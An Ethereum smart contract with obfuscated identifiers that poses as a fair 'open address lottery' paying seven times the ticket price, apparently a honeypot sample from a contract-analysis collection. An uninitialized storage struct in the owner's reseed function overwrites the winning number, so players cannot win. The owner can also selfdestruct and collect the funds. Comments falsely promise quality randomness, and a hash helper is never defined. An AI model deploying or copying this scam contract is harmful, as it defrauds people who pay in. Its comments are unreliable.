contract OpenAddressLottery{
    struct SeedComponents{
        uint _0x5a7600;
        uint _0x772e37;
        uint _0x05b822;
        uint _0xeceb27;
    }

    address _0x2bf9d4; //address of the owner
    uint private _0x622332; //seed used to calculate number of an address
    uint private _0xdac2d0; //last reseed - used to automatically reseed the contract every 1000 blocks
    uint LuckyNumber = 7; //if the number of an address equals 7, it wins

    mapping (address => bool) _0x0c2bf2; //keeping track of addresses that have already won

    function OpenAddressLottery() {
        _0x2bf9d4 = msg.sender;
        _0xc74a49(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed
    }

    function _0x90d57e() payable {
        if(msg.value<0.1 ether)
            return; //verify ticket price

        // make sure he hasn't won already
        require(_0x0c2bf2[msg.sender] == false);

        if(_0x026639(msg.sender) == LuckyNumber){ //check if it equals 7
            _0x0c2bf2[msg.sender] = true; // every address can only win once

            uint _0x298fc1=msg.value*7; //win = 7 times the ticket price

            if(_0x298fc1>this.balance) //if the balance isnt sufficient...
                _0x298fc1=this.balance; //...send everything we've got
            msg.sender.transfer(_0x298fc1);
        }

        if(block.number-_0xdac2d0>1000) //reseed if needed
            _0xc74a49(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed
    }

    function _0x026639(address _0xefd72e) constant returns(uint n){
        // calculate the number of current address - 1 in 8 chance
        n = uint(_0x02ec80(uint(_0xefd72e), _0x622332)[0]) % 8;
    }

    function _0xc74a49(SeedComponents _0x01da52) internal {
        _0x622332 = uint256(_0x02ec80(
            _0x01da52._0x5a7600,
            _0x01da52._0x772e37,
            _0x01da52._0x05b822,
            _0x01da52._0xeceb27
        )); //hash the incoming parameters and use the hash to (re)initialize the seed
        _0xdac2d0 = block.number;
    }

    function _0x7d1df3() {
        require(msg.sender==_0x2bf9d4);

        selfdestruct(msg.sender);
    }

    function _0xf0fb2d() { //reseed initiated by the owner - for testing purposes
        require(msg.sender==_0x2bf9d4);

        SeedComponents s;
        s._0x5a7600 = uint(msg.sender);
        s._0x772e37 = uint256(block.blockhash(block.number - 1));
        s._0x05b822 = block.difficulty*(uint)(block.coinbase);
        s._0xeceb27 = tx.gasprice * 7;

        _0xc74a49(s); //reseed
    }

    function () payable { //if someone sends money without any function call, just assume he wanted to participate
        if(msg.value>=0.1 ether && msg.sender!=_0x2bf9d4) //owner can't participate, he can only fund the jackpot
            _0x90d57e();
    }

}
